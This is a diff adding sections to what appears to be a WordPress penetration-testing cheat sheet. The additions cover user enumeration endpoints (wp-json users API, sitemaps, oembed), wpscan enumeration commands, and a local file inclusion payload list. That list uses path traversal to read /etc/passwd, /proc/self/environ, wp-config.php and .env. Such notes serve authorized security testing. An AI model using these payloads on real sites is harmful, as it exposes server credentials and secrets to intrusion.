@@ -34,11 +34,45 @@ Press ----> Ctrl + f (Search wordpress)
 curl -s http://example.com/ | grep 'WordPress'     # http
 curl -s https://example.com/ | grep 'WordPress'    # https
 ```
+### Username
+```bash
+# Sitemap
+      /wp-sitemap-users-1.xml
+      /sitemap.xml
+      /author-sitemap.xml
+
+# Authors Brute force
+      /author/username/.
+
+# oembed api
+      /?rest_route=/oembed/1.0/embed&url=
+
+# wp-json
+      /wp-json/wp/v2/users
+      /wp-json/wp/v2/users/ grep -i 'name'
+
+# login page Error Messages
+      Validate the list of users, have there account exists or not !
+```
 > Updating in a mean while...
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 # Automation Hacking 
+### Version 
+```bash
+wpscan --url http://example.com   --api-token YOUR_API_TOKEN   
+```
+
+### Username
+```bash
+wpscan --url http://target.com --enumerate u   --api-token YOUR_API_TOKEN 
+```
+
+## Overall 
+```bash
+wpscan --url https://example.com/ -e ap,vt,vp,tt,cb,dbe,u,m --api-token <token>  --format json --output scan.json
+```
 > Updating in a mean while...
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -51,3 +85,14 @@ Nuclei Template Detection
 [Nuclei Resource link](https://github.com/0xmrsecurity/Public_Poc/blob/main/nuclei/CVE-2023-6553.yaml)
 
 <img width="1901" height="461" alt="image" src="https://github.com/user-attachments/assets/8b6ef40f-53a4-4ad9-a070-e5e74c956f34" />
+
+# lfi 
+> local file Inclusion
+```bash
+/wordpress/images../etc/passwd
+/wordpress/images../etc/nginx/sites-available/default
+/wordpress/images../proc/self/cmdline
+/wordpress/images../proc/self/environ
+/wordpress/images../wp-config.php
+/wordpress/images../.env
+```
